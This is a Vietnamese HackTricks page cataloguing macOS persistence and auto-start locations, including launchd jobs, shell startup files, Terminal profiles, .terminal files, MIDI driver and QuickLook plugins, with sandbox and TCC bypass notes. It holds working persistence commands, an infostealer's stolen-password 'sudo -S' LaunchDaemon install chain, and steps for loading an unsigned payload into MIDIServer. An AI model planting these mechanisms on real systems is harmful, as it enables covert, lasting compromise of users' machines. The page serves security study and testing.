# Tự khởi động trên macOS

{{#include ../banners/hacktricks-training.md}}

Phần này chủ yếu dựa trên loạt bài blog [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/). Mục tiêu là xác định những vị trí mà việc ghi tệp có thể dẫn đến thực thi mã về sau, sự kiện kích hoạt việc thực thi và các quyền cần thiết. Việc một vị trí tồn tại không chứng minh rằng cơ chế đó đang được bật. Các kiểm tra cục bộ nêu dưới đây được thực hiện trên macOS 26.5.2 (ngày 5 tháng 10 năm 2026); chúng không xác lập hành vi trên mọi bản phát hành macOS.

> [!NOTE]
> “Kích hoạt bằng thao tác ghi” không phải lúc nào cũng có nghĩa là “chạy ngay sau khi ghi”. Một số vị trí chỉ được đọc khi đăng nhập, khi một ứng dụng cụ thể khởi chạy hoặc khi người dùng thực hiện một hành động. Payload có thể ghi bên trong một job đã được cấu hình cũng khác với quyền đăng ký một job mới. Hãy thử nghiệm trong tài khoản dùng riêng hoặc VM trước khi dựa vào kỹ thuật này.

## Vượt qua sandbox

> [!TIP]
> Tại đây, bạn có thể tìm thấy các vị trí khởi chạy hữu ích để **vượt qua sandbox**, cho phép bạn chỉ cần **ghi thứ gì đó vào một tệp** rồi **chờ đợi** một **hành động** rất **phổ biến**, một **khoảng thời gian** xác định hoặc một **hành động thường có thể thực hiện** từ bên trong sandbox mà không cần quyền root.

### Launchd

- Hữu ích để vượt qua sandbox: [✅](https://emojipedia.org/check-mark-button)
- Vượt qua TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Các vị trí

- **`/Library/LaunchAgents`**
  - **Kích hoạt**: Người dùng đăng nhập (hoặc đăng ký tường minh)
  - Cần quyền root
- **`/Library/LaunchDaemons`**
  - **Kích hoạt**: Hệ thống khởi động (hoặc đăng ký tường minh)
  - Cần quyền root
- **`/System/Library/LaunchAgents`**
  - **Kích hoạt**: Người dùng đăng nhập; vị trí hệ thống được Apple bảo vệ
- **`/System/Library/LaunchDaemons`**
  - **Kích hoạt**: Hệ thống khởi động; vị trí hệ thống được Apple bảo vệ
- **`~/Library/LaunchAgents`**
  - **Kích hoạt**: Đăng nhập lại

Không có vị trí `~/Library/LaunchDaemons` nào được `launchd` quét. Các job theo từng người dùng nằm trong `~/Library/LaunchAgents`; thư mục daemon cấp hệ thống là `/Library/LaunchDaemons`. [Hướng dẫn khởi động launchd của Apple](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html) ghi lại các vị trí được quét.

> [!TIP]
> Một sự thật thú vị là **`launchd`** có một property list nhúng trong phần Mach-o `__Text.__config`, chứa các dịch vụ nổi tiếng khác mà launchd phải khởi động. Hơn nữa, các dịch vụ này có thể chứa `RequireSuccess`, `RequireRun` và `RebootOnSuccess`, nghĩa là chúng phải được chạy và hoàn tất thành công.
>
> Tất nhiên, không thể sửa đổi nó vì có code signing.

#### Mô tả & khai thác

**`launchd`** là **process** đầu tiên được thực thi bởi nhân OS X khi khởi động và là process cuối cùng kết thúc khi tắt máy. Nó luôn phải có **PID 1**. Process này sẽ **đọc và thực thi** các cấu hình được chỉ định trong các **plist** **ASEP** tại:

- `/Library/LaunchAgents`: Agent theo từng người dùng do quản trị viên cài đặt
- `/Library/LaunchDaemons`: Daemon toàn hệ thống do quản trị viên cài đặt
- `/System/Library/LaunchAgents`: Agent theo từng người dùng do Apple cung cấp.
- `/System/Library/LaunchDaemons`: Daemon toàn hệ thống do Apple cung cấp.

Khi người dùng đăng nhập, `launchd` tải các plist trong `~/Library/LaunchAgents` của người dùng đó với quyền của người dùng. Các job được khởi chạy tùy theo các key của chúng; chỉ tải một plist không có nghĩa là process sẽ được thực thi ngay lập tức.

**Khác biệt chính giữa agent và daemon là agent được tải khi người dùng đăng nhập, còn daemon được tải khi hệ thống khởi động** (vì có những dịch vụ như ssh cần được thực thi trước khi bất kỳ người dùng nào truy cập hệ thống). Agent cũng có thể sử dụng GUI, còn daemon cần chạy trong nền.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
        <string>com.apple.someidentifier</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>touch /tmp/launched</string>
    </array>
    <key>RunAtLoad</key><true/> <!--Execute at system startup-->
    <key>StartInterval</key>
    <integer>800</integer> <!--Execute each 800s-->
    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key><false/> <!--Re-execute if exit unsuccessful-->
        <!--If previous is true, then re-execute in successful exit-->
    </dict>
</dict>
</plist>
```

Mỗi phần tử `ProgramArguments` là một đối số riêng; `launchd` không phân tích một chuỗi đơn thành lệnh shell. Có thể kiểm tra cú pháp ví dụ đã sửa ở trên mà không cần tải nó bằng `plutil -lint /path/to/example.plist`. Xem mục `man launchd.plist` trên máy để biết thêm về `ProgramArguments`, `RunAtLoad` và `KeepAlive`.

#### Trình kích hoạt sự kiện tệp trong các job hiện có

Một agent hoặc daemon **đã được tải** có thể dùng `WatchPaths` để khởi chạy khi một đường dẫn được chỉ định thay đổi. `QueueDirectories` khởi chạy một job khi thư mục không rỗng; `StartOnMount` khởi chạy khi một volume được mount. [Hướng dẫn launchd của Apple](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html#//apple_ref/doc/uid/10000172i-CH2-SW9) có các ví dụ về `WatchPaths` và `QueueDirectories`. Ghi vào một tệp đang được theo dõi sẽ kích hoạt **job đã được cấu hình**; thao tác này chỉ cho phép thực thi mã tùy ý nếu người ghi cũng có thể kiểm soát tệp thực thi, script hoặc dữ liệu mà job diễn giải. Chỉ ghi một plist mới bên ngoài vị trí được quét hoặc đăng ký sẽ không tải plist đó.

PoC tự dọn dẹp này đăng ký một **user agent tạm thời** có tên duy nhất, chỉ thay đổi tệp được chính nó theo dõi, rồi gỡ bỏ agent. PoC đã chạy thành công trên macOS 26.5.2 mà không cần đăng xuất hoặc khởi động lại:

```python
import os, pathlib, plistlib, subprocess, tempfile, time, uuid

label = f"org.hacktricks.watchtest.{uuid.uuid4().hex}"
target = f"gui/{os.getuid()}"
with tempfile.TemporaryDirectory(prefix="ht-watch-") as root:
    base = pathlib.Path(root)
    watched, marker, plist = base / "watched", base / "ran", base / "agent.plist"
    watched.write_text("before\n")
    plist.write_bytes(plistlib.dumps({
        "Label": label,
        "ProgramArguments": ["/usr/bin/touch", str(marker)],
        "WatchPaths": [str(watched)],
        "RunAtLoad": False,
    }))
    subprocess.run(["launchctl", "bootstrap", target, str(plist)], check=True)
    try:
        marker.unlink(missing_ok=True)
        watched.write_text("after\n")
        for _ in range(30):
            if marker.exists():
                break
            time.sleep(0.1)
        print("watch fired:", marker.exists())
    finally:
        subprocess.run(["launchctl", "bootout", f"{target}/{label}"], check=True)
```

Lần chạy cục bộ in ra `watch fired: True`, và `bootout` đã thành công. Ở đây, `launchctl bootstrap` chỉ được dùng trong PoC cô lập; **không cần dùng lệnh này** cho một job đã được load. Để đánh giá an toàn một job hiện có, hãy đọc plist và đường dẫn `ProgramArguments` đã phân giải, sau đó kiểm tra xem executable hoặc file được thông dịch liên quan có quyền ghi hay không mà không sửa đổi chúng.

Có những trường hợp **agent cần được thực thi trước khi người dùng đăng nhập**; chúng được gọi là **PreLoginAgents**. Ví dụ, tính năng này hữu ích để cung cấp công nghệ hỗ trợ khi đăng nhập. Chúng cũng có thể được tìm thấy trong `/Library/LaunchAgents` (xem ví dụ [**tại đây**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents)).

> [!TIP]
> Các file cấu hình Daemon hoặc Agent mới sẽ được **load sau lần khởi động lại tiếp theo hoặc bằng cách dùng** `launchctl load <target.plist>`. **Cũng có thể load các file .plist không có phần mở rộng đó** bằng `launchctl -F <file>` (tuy nhiên, các file plist đó sẽ không được tự động load sau khi khởi động lại).\
> Cũng có thể **unload** bằng `launchctl unload <target.plist>` (tiến trình được chỉ định sẽ bị chấm dứt),
>
> Để **đảm bảo** không có **bất cứ thứ gì** (chẳng hạn như một override) **ngăn cản** **Agent** hoặc **Daemon** **chạy**, hãy chạy: `sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`

Liệt kê tất cả agent và daemon đã được load bởi người dùng hiện tại:

```bash
launchctl list
```

#### Ví dụ về chuỗi LaunchDaemon độc hại (dùng lại mật khẩu)

Một infostealer macOS gần đây đã dùng lại **mật khẩu sudo bị đánh cắp** để cài một user agent và một LaunchDaemon chạy với quyền root:<sup>[[1]](#references)</sup>

- Ghi vòng lặp của agent vào `~/.agent` và cấp quyền thực thi.
- Tạo một plist trong `/tmp/starter` trỏ đến agent đó.
- Dùng lại mật khẩu bị đánh cắp với `sudo -S` để sao chép plist vào `/Library/LaunchDaemons/com.finder.helper.plist`, đặt chủ sở hữu là `root:wheel` rồi nạp bằng `launchctl load`.
- Khởi chạy agent âm thầm bằng `nohup ~/.agent >/dev/null 2>&1 &` để tách đầu ra.

```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> Một daemon plist được đặt trong `/Library/LaunchDaemons` không trở nên an toàn chỉ vì được gán quyền sở hữu cho người dùng. `launchd` yêu cầu quyền sở hữu và quyền truy cập phù hợp đối với các job hệ thống, đồng thời có thể từ chối một plist không an toàn. Daemon do root sở hữu thường chạy với quyền root, trừ khi cấu hình của nó chọn một tài khoản khác. Hãy kiểm tra `UserName`, `GroupName`, quyền sở hữu và thông tin chẩn đoán từ `launchctl`; không suy đoán danh tính thực thi chỉ dựa vào tên chủ sở hữu plist.

#### Thông tin thêm về launchd

**`launchd`** là tiến trình ở chế độ người dùng **đầu tiên** được khởi chạy từ **kernel**. Quá trình khởi chạy phải **thành công** và tiến trình này **không thể thoát hoặc gặp sự cố**. Nó thậm chí còn được **bảo vệ** trước một số **tín hiệu kết thúc**.

Một trong những việc đầu tiên `launchd` làm là **khởi chạy** tất cả các **daemon**, chẳng hạn như:

- **Timer daemon** dựa trên thời điểm cần thực thi:
  - `com.apple.atrun.plist` gọi `/usr/libexec/atrun` với `StartInterval = 30` giây trong macOS 26.5.2; trạng thái bật hiệu lực có thể khác với khóa `Disabled` trong plist vì launchd lưu các ghi đè riêng.
  - `com.vix.cron.plist` gọi `/usr/sbin/cron` khi `/usr/lib/cron/tabs` có chứa các job. `com.apple.systemstats.daily` là một dịch vụ được lập lịch khác, không phải cron daemon.
- **Network daemon**, chẳng hạn như:
  - `org.cups.cups-lpd`: Lắng nghe trên TCP (`SockType: stream`) với `SockServiceName: printer`
    - SockServiceName phải là một cổng hoặc một dịch vụ trong `/etc/services`
  - `com.apple.xscertd.plist`: Lắng nghe trên cổng TCP 1640
- **Path daemon** được thực thi khi một đường dẫn được chỉ định thay đổi:
  - `com.apple.postfix.master`: Kiểm tra đường dẫn `/etc/postfix/aliases`
- **Daemon thông báo IOKit**:
  - `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port:**
  - `com.apple.xscertd-helper.plist`: Mục `MachServices` cho biết tên `com.apple.xscertd.helper`
- **UserEventAgent:**
  - Cơ chế này khác với cơ chế trước. Nó khiến launchd khởi chạy ứng dụng để phản hồi các sự kiện cụ thể. Tuy nhiên, trong trường hợp này, binary chính liên quan không phải là `launchd` mà là `/usr/libexec/UserEventAgent`. Nó tải các plugin từ thư mục bị SIP hạn chế /System/Library/UserEventPlugins/, trong đó mỗi plugin khai báo hàm khởi tạo trong khóa `XPCEventModuleInitializer` hoặc, với các plugin cũ hơn, trong dict `CFPluginFactories` dưới khóa `FB86416D-6164-2070-726F-70735C216EC0` của `Info.plist`.

### Tệp khởi động shell

Bài viết: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)<sup>[[2]](#references)</sup>\
Bài viết (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

- Hữu ích để bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
  - Nhưng bạn cần tìm một ứng dụng có TCC bypass để thực thi một shell tải các tệp này

#### Vị trí

- **`~/.zshenv`** (hoặc bản biên dịch mới hơn **`~/.zshenv.zwc`**)
  - **Kích hoạt**: Mọi lần gọi zsh thông thường, bao gồm cả `zsh -c` không tương tác; `zsh -f` bỏ qua các tệp khởi động của người dùng.
- **`~/.zshrc`**
  - **Kích hoạt**: Khi zsh tương tác khởi chạy.
- **`~/.zprofile`, `~/.zlogin`**
  - **Kích hoạt**: Khi zsh đăng nhập khởi chạy; lần lượt được đọc trước và sau `.zshrc`.
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
  - **Kích hoạt**: Mở terminal bằng zsh
  - Cần quyền root
- **`~/.zlogout`**
  - **Kích hoạt**: zsh đăng nhập thoát bình thường, không phải mỗi lần terminal hoặc shell thoát.
- **`/etc/zlogout`**
  - **Kích hoạt**: Thoát terminal bằng zsh
  - Cần quyền root
- Có thể còn thêm trong: **`man zsh`**
- **`~/.bashrc`**
  - **Kích hoạt**: Khởi chạy Bash tương tác **không đăng nhập**. Bash đăng nhập tương tác chỉ đọc tệp này nếu một tệp đăng nhập gọi nó một cách tường minh.
- **`~/.bash_profile`, `~/.bash_login`, `~/.profile`**
  - **Kích hoạt**: Khởi chạy Bash đăng nhập; tệp đầu tiên có thể đọc được theo thứ tự đó sẽ chạy. `~/.profile` bị bỏ qua nếu một trong hai tệp đứng trước tồn tại.
- **`/etc/profile`**
  - **Kích hoạt**: Khởi chạy Bash đăng nhập; cần quyền root để thay đổi tệp này.
- **`~/.tcshrc`** hoặc, nếu không có, **`~/.cshrc`**
  - **Kích hoạt**: Khởi chạy `tcsh`, bao gồm cả `tcsh -c` không tương tác trên máy Mac này. Người dùng phải thực sự gọi `tcsh`; đây không phải shell mặc định của macOS.
- **`~/.login`**
  - **Kích hoạt**: Khởi chạy `tcsh` đăng nhập sau tệp rc của nó.
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
  - **Kích hoạt**: Dự kiến sẽ kích hoạt cùng xterm, nhưng xterm **chưa được cài đặt**; ngay cả sau khi cài đặt vẫn xuất hiện lỗi này: xterm: `DISPLAY is not set`<sup>[[3]](#references)</sup>

#### Mô tả & Khai thác

Khi khởi tạo môi trường shell như `zsh` hoặc `bash`, **một số tệp khởi động sẽ chạy**. Hiện tại macOS dùng `/bin/zsh` làm shell mặc định. Việc Terminal hoặc SSH khởi chạy shell đăng nhập hay shell tương tác phụ thuộc vào cấu hình của chúng; đừng cho rằng mọi tệp ở trên đều chạy trong mỗi phiên. Dù `bash` và `sh` cũng có trong macOS, cần gọi chúng một cách tường minh mới sử dụng được.<sup>[[2]](#references)</sup> [Tài liệu tham khảo về tệp khởi động zsh](https://zsh.sourceforge.io/Doc/Release/Files.html) nêu rõ thứ tự, cách ghi đè bằng `ZDOTDIR` và quy tắc `.zwc`.

Thử nghiệm chỉ đọc sau đây sử dụng một `ZDOTDIR` dùng một lần trên macOS 26.5.2. Thử nghiệm cho thấy những tệp người dùng nào được đọc; không có tệp khởi động shell thực nào bị thay đổi:

```bash
lab=$(mktemp -d)
for name in zshenv zprofile zshrc zlogin zlogout; do
  printf 'print -r -- %s >> "$ZDOTDIR/seen"\n' "$name" > "$lab/.$name"
done
for flags in -c -ic -lc -lic; do
  : > "$lab/seen"
  ZDOTDIR="$lab" /bin/zsh "$flags" ':'
  printf '%s: %s\n' "$flags" "$(tr '\n' ' ' < "$lab/seen")"
done
rm -r "$lab"
```

Thứ tự quan sát được là `-c`: `zshenv`; `-ic`: `zshenv zshrc`; `-lc`: `zshenv zprofile zlogin`; `-lic`: `zshenv zprofile zshrc zlogin zlogout`. `ZDOTDIR` phải trỏ đến thư mục thay thế từ trước; chỉ ghi các tệp vào một thư mục tùy ý là chưa đủ.

[Tài liệu tham khảo về khởi động của Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html) phân biệt shell đăng nhập với shell tương tác. Trên máy thử nghiệm macOS 26.5.2, một `HOME` riêng biệt chứa cả bốn tệp khởi động của người dùng cho kết quả: `bash -c` → không tệp nào, `bash -ic` → `.bashrc`, `bash -lc` và `bash -lic` → chỉ `.bash_profile`. Khi xóa `.bash_profile`, Bash đăng nhập sẽ đọc `.bash_login`, rồi đến `.profile` nếu tệp đó cũng bị xóa. `BASH_ENV` có thể trỏ Bash không tương tác đến một tệp, nhưng biến môi trường đó phải được đặt sẵn trong tiến trình gọi. Lệnh `exit` tường minh từ Bash đăng nhập cũng có thể nạp `~/.bash_logout`.

Tài liệu hướng dẫn `tcsh(1)` trên máy ghi lại thứ tự khởi động riêng. Với `HOME` dùng một lần, `/bin/tcsh -c :` đọc `.tcshrc`, hoặc `.cshrc` nếu không có `.tcshrc`. Một phiên `tcsh` đăng nhập dùng một lần đọc `.tcshrc` và `.login`. Các kiểm tra này chỉ tạo và xóa những tệp tạm thời.

### Mở lại các ứng dụng

> [!CAUTION]
> Trong thử nghiệm, việc cấu hình khai thác được chỉ định rồi đăng xuất và đăng nhập lại, hoặc thậm chí khởi động lại, không khiến ứng dụng chạy. Có thể ứng dụng cần đang chạy khi thực hiện các thao tác này.

**Bài viết**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)<sup>[[4]](#references)</sup>

- Hữu ích để vượt qua sandbox: [✅](https://emojipedia.org/check-mark-button)
- Vượt qua TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Vị trí

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
  - **Kích hoạt**: Khởi động lại để mở lại ứng dụng

#### Mô tả & Khai thác

Tất cả ứng dụng sẽ được mở lại đều nằm trong plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`<sup>[[4]](#references)</sup>

Vì vậy, để khiến các ứng dụng được mở lại khởi chạy ứng dụng của bạn, bạn chỉ cần **thêm ứng dụng của mình vào danh sách**.

Có thể tìm UUID bằng cách liệt kê thư mục đó hoặc chạy `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Để kiểm tra những ứng dụng sẽ được mở lại, bạn có thể chạy:

```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

Để **thêm một ứng dụng vào danh sách này**, bạn có thể sử dụng:

```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
    ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

### Tùy chọn Terminal

Bài viết: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.github.io/beyond/beyond_0020/)<sup>[[5]](#references)</sup>

- Hữu ích để bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- Bypass TCC: [✅](https://emojipedia.org/check-mark-button)
  - Terminal từng có quyền FDA của người dùng sử dụng nó

#### Vị trí

- **`~/Library/Preferences/com.apple.Terminal.plist`**
  - **Kích hoạt**: Mở cửa sổ hoặc tab Terminal mới bằng profile có cài đặt Shell chứa lệnh khởi động

#### Mô tả & Khai thác

Trong **`~/Library/Preferences`** lưu các tùy chọn của người dùng trong Applications. Một số tùy chọn này có thể chứa cấu hình để **thực thi các ứng dụng/script khác**.<sup>[[5]](#references)</sup>

Ví dụ, Terminal có thể thực thi một lệnh khi khởi động:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Cấu hình này được thể hiện trong tệp **`~/Library/Preferences/com.apple.Terminal.plist`** như sau:

```bash
[...]
"Window Settings" => {
    "Basic" => {
      "CommandString" => "touch /tmp/terminal_pwn"
      "Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
      "FontAntialias" => 1
      "FontWidthSpacing" => 1.004032258064516
      "name" => "Basic"
      "ProfileCurrentVersion" => 2.07
      "RunCommandAsShell" => 0
      "type" => "Window Settings"
    }
[...]
```

Nếu profile liên quan có lệnh khởi động và Terminal đọc tùy chọn đó, một phiên mới sử dụng profile này có thể thực thi lệnh. [Hướng dẫn Terminal hiện tại của Apple](https://support.apple.com/guide/terminal/trmlshll/mac) ghi lại lệnh **Shell → Startup** theo từng profile. Chỉ mở Terminal mà không tạo phiên mới sử dụng profile đó là chưa đủ. Các chỉnh sửa tùy chọn bên dưới **không** được thực hiện trên máy Mac dùng cho nghiên cứu.

Bạn có thể thêm mục này từ CLI bằng cách:

```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```

### Terminal Scripts / Other file extensions

- Hữu ích để bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Terminal có thể sử dụng quyền FDA của người dùng

#### Vị trí

- **Bất kỳ đâu**
  - **Kích hoạt**: Mở tệp `.terminal`, `.command` hoặc `.tool` tương ứng

#### Mô tả & Khai thác

Nếu người dùng mở tệp cài đặt **`.terminal`**, Terminal có thể tạo một phiên từ profile của tệp; các tệp thực thi **`.command`** và **`.tool`** cũng có thể mở trong Terminal. Đây là thao tác mở tệp trực tiếp để kích hoạt, không phải thực thi chỉ bằng cách mở Terminal. Quyền TCC được kế thừa phụ thuộc vào các quyền thực tế đã cấp cho Terminal và thao tác được thực hiện. Ví dụ lịch sử bên dưới không được chạy trên máy Mac nghiên cứu.

Hãy thử với:

```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>CommandString</key>
	<string>/usr/bin/touch /tmp/ht-terminal-file-marker</string>
	<key>ProfileCurrentVersion</key>
	<real>2.0600000000000001</real>
	<key>RunCommandAsShell</key>
	<false/>
	<key>name</key>
	<string>exploit</string>
	<key>type</key>
	<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# After inspecting the marker, remove the disposable file and marker:
rm -f /tmp/test.terminal /tmp/ht-terminal-file-marker
```

Bạn cũng có thể dùng các phần mở rộng **`.command`**, **`.tool`** với nội dung là các shell script thông thường; chúng cũng sẽ được mở bằng Terminal.

> [!CAUTION]
> Nếu Terminal có **Full Disk Access**, nó sẽ có thể hoàn tất hành động đó (lưu ý rằng lệnh được thực thi sẽ hiển thị trong cửa sổ Terminal).

### Audio Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)<sup>[[6]](#references)</sup>\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)<sup>[[7]](#references)</sup>

- Hữu ích để bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
  - Bạn có thể nhận được thêm một số quyền truy cập TCC

#### Vị trí

- **`/Library/Audio/Plug-Ins/HAL`**
  - Cần quyền root
  - **Kích hoạt**: Core Audio server tải một HAL device plug-in tương thích; việc khởi động lại server có thể khiến hệ thống tìm kiếm lại
- **`/Library/Audio/Plug-ins/Components`**
  - Cần quyền root
  - **Kích hoạt**: Một audio host phát hiện và khởi tạo Audio Unit đã cài đặt
- **`~/Library/Audio/Plug-ins/Components`**
  - **Kích hoạt**: Một audio host phát hiện và khởi tạo Audio Unit đã cài đặt
- **`/System/Library/Components`**
  - Vị trí do Apple cung cấp và được hệ thống bảo vệ
  - **Kích hoạt**: Một audio host khởi tạo system component phù hợp

#### Mô tả

Theo các writeup trước đây, có thể **biên dịch một số audio plugin** và khiến chúng được tải.<sup>[[6]](#references)[[7]](#references)</sup>

HAL device plug-in và Audio Unit là các đường dẫn tải riêng biệt. [Hướng dẫn lưu trữ Audio Unit của Apple](https://developer.apple.com/library/archive/documentation/MusicAudio/Conceptual/CoreAudioOverview/ARoadmaptoCommonTasks/ARoadmaptoCommonTasks.html) cho biết host phải tìm và khởi tạo một component; chỉ sao chép nó vào thư mục quét hoặc khởi động lại `coreaudiod` không chứng minh được rằng nó đã thực thi. Plug-in AUv2 chạy trong tiến trình host, trong khi [hướng dẫn Audio Unit hiện tại của Apple](https://developer.apple.com/documentation/audiotoolbox/incorporating-audio-effects-and-instruments) cho biết AUv3 mặc định chạy trong một tiến trình riêng trên macOS. Các yêu cầu về chữ ký, sandbox và library validation tùy thuộc vào host. Không có audio plug-in nào được cài đặt hoặc thực thi trên máy Mac nghiên cứu.

### CoreMIDI Drivers (MIDIServer)

Writeup: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- Hữu ích để bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Mã của bạn chạy bên trong tiến trình `MIDIServer`, không phải sandbox của ứng dụng
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - `MIDIServer` chạy trong profile sandbox `seatbelt` riêng

#### Vị trí

- **`~/Library/Audio/MIDI Drivers/*.plugin`**
  - Không cần quyền root (người dùng có thể ghi)
  - **Kích hoạt**: `MIDIServer` khởi động (lại). Tiến trình này được khởi chạy theo yêu cầu khi bất kỳ tiến trình nào lần đầu sử dụng CoreMIDI (mở *Audio MIDI Setup*, GarageBand, một DAW hoặc một trang sử dụng WebMIDI)
- **`/Library/Audio/MIDI Drivers/*.plugin`**
  - Cần quyền root
  - **Kích hoạt**: Tương tự như trên

#### Mô tả & Khai thác

`MIDIServer` của Apple (`/System/Library/Frameworks/CoreMIDI.framework/MIDIServer`) tải các bundle **driver** MIDI từ các thư mục `Audio/MIDI Drivers`. Binary này được Apple ký, nhưng đi kèm entitlement `com.apple.security.cs.disable-library-validation`, nên nó sẽ tải một bundle **chưa được ký hoặc được ký ad-hoc bởi một team khác**, cho phép thực thi mã bên trong một tiến trình riêng do Apple sở hữu **mà không cần quyền root**.<sup>[[53]](#references)</sup>

Đã xác minh trên macOS 26 (chỉ đọc):

```bash
# user-writable, no root needed
ls -ld ~/Library/"Audio/MIDI Drivers"            # exists, owned by the user
codesign -d --entitlements :- /System/Library/Frameworks/CoreMIDI.framework/MIDIServer 2>/dev/null \
  | grep disable-library-validation              # -> com.apple.security.cs.disable-library-validation
```

Driver là một bundle tiêu chuẩn export factory `MIDIDriverInterface`; đặt payload trong factory/constructor để nó chạy ngay khi `MIDIServer` liệt kê các driver. Build nó, thả vào `~/Library/Audio/MIDI Drivers/Evil.plugin`, rồi kích hoạt load mà không cần logout/reboot:

```bash
# starts MIDIServer, which scans the driver directories
open -a "Audio MIDI Setup"
```

### QuickLook Plugins

Bài viết: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)<sup>[[8]](#references)</sup>

- Hữu ích để bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
  - Bạn có thể nhận thêm một số quyền truy cập TCC

#### Vị trí

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Mô tả & Khai thác

QuickLook plugins có thể được thực thi khi bạn **kích hoạt xem trước một tệp** (nhấn phím cách khi đã chọn tệp trong Finder) và có cài đặt **plugin hỗ trợ loại tệp đó**.<sup>[[8]](#references)</sup>

Bạn có thể biên dịch QuickLook plugin của riêng mình, đặt plugin vào một trong các vị trí trên để tải plugin, sau đó mở một tệp được hỗ trợ và nhấn phím cách để kích hoạt plugin.

